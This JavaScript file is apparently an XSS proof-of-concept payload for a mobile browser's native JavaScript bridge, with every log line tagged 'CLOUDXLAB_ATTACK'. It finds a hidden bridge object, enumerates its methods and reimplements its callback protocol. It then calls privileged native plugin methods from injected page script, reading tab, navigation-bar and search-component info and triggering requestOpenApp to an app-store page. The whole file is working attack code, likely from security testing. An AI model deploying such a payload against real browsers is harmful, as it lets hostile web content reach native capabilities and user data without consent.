(function() {
  console.log('CLOUDXLAB_ATTACK: xss_verify result=success');
  var nativeBridge = window._hwbrNative;
  if (!nativeBridge) {
    console.log('CLOUDXLAB_ATTACK: no bridge found');
    return;
  }
  console.log('CLOUDXLAB_ATTACK: bridge found, methods=' + Object.getOwnPropertyNames(nativeBridge).join(','));
  var callbacks = {};
  var callbackId = Math.floor(Math.random() * 2000000000);
  var messagesFromNative = [];
  var isProcessing = false;
  function nextTick(fn) { setTimeout(fn); }
  function buildPayload(payload, message) {
    var trans = {
      s: function(msg) { return msg.slice(1); },
      t: function(msg) { return true; },
      f: function(msg) { return false; },
      N: function(msg) { return null; },
      n: function(msg) { return +msg.slice(1); },
      A: function(msg) { return atob(msg.slice(1)); },
      S: function(msg) { return window.atob(msg.slice(1)); }
    };
    payload.push((trans[message.charAt(0)] || (function(msg) { return JSON.parse(msg); }))(message));
  }
  function processMessage(message) {
    var firstChar = message.charAt(0);
    if (firstChar === 'S' || firstChar === 'F') {
      var success = firstChar === 'S';
      var keepCallback = message.charAt(1) === '1';
      var spaceIdx = message.indexOf(' ', 2);
      var status = +message.slice(2, spaceIdx);
      var nextSpaceIdx = message.indexOf(' ', spaceIdx + 1);
      var msgCallbackId = message.slice(spaceIdx + 1, nextSpaceIdx);
      var payloadMessage = message.slice(nextSpaceIdx + 1);
      var payload = [];
      buildPayload(payload, payloadMessage);
      if (payload.length === 1) { payload = payload[0]; }
      callbackFromNative(msgCallbackId, success, status, payload, keepCallback);
    }
  }
  function popMessageFromQueue() {
    var messageBatch = messagesFromNative.shift();
    if (messageBatch === '*') { return '*'; }
    var spaceIdx = messageBatch.indexOf(' ');
    var msgLen = +messageBatch.slice(0, spaceIdx);
    var message = messageBatch.substr(spaceIdx + 1, msgLen);
    messageBatch = messageBatch.slice(spaceIdx + msgLen + 1);
    if (messageBatch) { messagesFromNative.unshift(messageBatch); }
    return message;
  }
  function processMessages() {
    if (isProcessing || messagesFromNative.length === 0) { return; }
    isProcessing = true;
    try {
      var message = popMessageFromQueue();
      processMessage(message);
    } finally {
      isProcessing = false;
      if (messagesFromNative.length > 0) { nextTick(processMessages); }
    }
  }
  function callbackFromNative(cbId, isSuccess, status, args, keepCallback) {
    var cb = callbacks[cbId];
    console.log('CLOUDXLAB_ATTACK: callback id=' + cbId + ' success=' + isSuccess + ' status=' + status + ' args=' + JSON.stringify(args));
    if (cb) {
      if (isSuccess && status === 1) {
        cb.success && cb.success(args);
      } else if (!isSuccess) {
        cb.fail && cb.fail(args, status);
      }
      if (!keepCallback) { delete callbacks[cbId]; }
    }
  }
  if (!window.hwbr) { window.hwbr = {}; }
  window.hwbr.callbackFromNative = callbackFromNative;
  function nativeInvoke(service, action, args, successFn, failFn) {
    var cbId = 'attack_' + (callbackId++);
    if (successFn || failFn) {
      callbacks[cbId] = { success: successFn, fail: failFn };
    }
    var argsJson = JSON.stringify(args || []);
    var messages = nativeBridge.invoke(service, action, cbId, argsJson, -1);
    console.log('CLOUDXLAB_ATTACK: invoke ' + service + '.' + action + ' cbId=' + cbId + ' rawReturn=' + messages);
    if (messages) {
      messagesFromNative.push(messages);
      nextTick(processMessages);
    }
  }
  function nativeInvokeSync(service, action, args) {
    var argsJson = JSON.stringify(args || []);
    var result = nativeBridge.invokeSync(service, action, argsJson);
    console.log('CLOUDXLAB_ATTACK: invokeSync ' + service + '.' + action + ' result=' + result);
    return result;
  }
  console.log('CLOUDXLAB_ATTACK: === starting plugin calls ===');
  try {
    nativeInvokeSync('browser', 'getNavBarInfoSync', []);
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invokeSync getNavBarInfoSync error=' + e.message);
  }
  try {
    nativeInvokeSync('browser', 'getNativeCurrentComponentInfoSync', []);
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invokeSync getNativeCurrentComponentInfoSync error=' + e.message);
  }
  try {
    nativeInvokeSync('browser', 'isFeatureEnableSync', ['requestOpenApp']);
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invokeSync isFeatureEnableSync error=' + e.message);
  }
  try {
    nativeInvoke('browser', 'requestOpenApp',
      [{ appUri: 'store://appgallery.huawei.com/app/detail?id=C1081898888199154560' }],
      function(result) { console.log('CLOUDXLAB_ATTACK: requestOpenApp SUCCESS=' + JSON.stringify(result)); },
      function(err, status) { console.log('CLOUDXLAB_ATTACK: requestOpenApp FAIL=' + JSON.stringify(err) + ' status=' + status); }
    );
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invoke requestOpenApp error=' + e.message);
  }
  try {
    nativeInvoke('browser', 'getTabInfo', [],
      function(result) { console.log('CLOUDXLAB_ATTACK: getTabInfo SUCCESS=' + JSON.stringify(result)); },
      function(err, status) { console.log('CLOUDXLAB_ATTACK: getTabInfo FAIL=' + JSON.stringify(err) + ' status=' + status); }
    );
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invoke getTabInfo error=' + e.message);
  }
  try {
    nativeInvoke('browser', 'getNavBarInfo', [],
      function(result) { console.log('CLOUDXLAB_ATTACK: getNavBarInfo SUCCESS=' + JSON.stringify(result)); },
      function(err, status) { console.log('CLOUDXLAB_ATTACK: getNavBarInfo FAIL=' + JSON.stringify(err) + ' status=' + status); }
    );
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invoke getNavBarInfo error=' + e.message);
  }
  try {
    nativeInvoke('browser', 'getSearchComponentInfo', [],
      function(result) { console.log('CLOUDXLAB_ATTACK: getSearchComponentInfo SUCCESS=' + JSON.stringify(result)); },
      function(err, status) { console.log('CLOUDXLAB_ATTACK: getSearchComponentInfo FAIL=' + JSON.stringify(err) + ' status=' + status); }
    );
  } catch(e) {
    console.log('CLOUDXLAB_ATTACK: invoke getSearchComponentInfo error=' + e.message);
  }
  console.log('CLOUDXLAB_ATTACK: === plugin calls dispatched, waiting for callbacks ===');
})();
